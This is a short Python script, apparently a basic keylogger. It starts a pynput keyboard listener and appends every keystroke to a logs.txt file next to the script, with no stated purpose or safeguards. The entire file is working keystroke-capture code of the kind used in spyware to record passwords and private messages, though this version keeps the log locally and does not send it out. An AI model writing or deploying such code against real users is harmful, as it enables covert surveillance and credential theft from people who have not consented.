import os

import pynput


def on_key_pressed(key):
    with open(f"{os.path.dirname(__file__)}/logs.txt", "a") as logs:
        logs.write(f"{key}\n")


def main() -> None:
    pynput.keyboard.Listener(on_press=on_key_pressed).start()

    input()

if __name__ == "__main__":
    main()
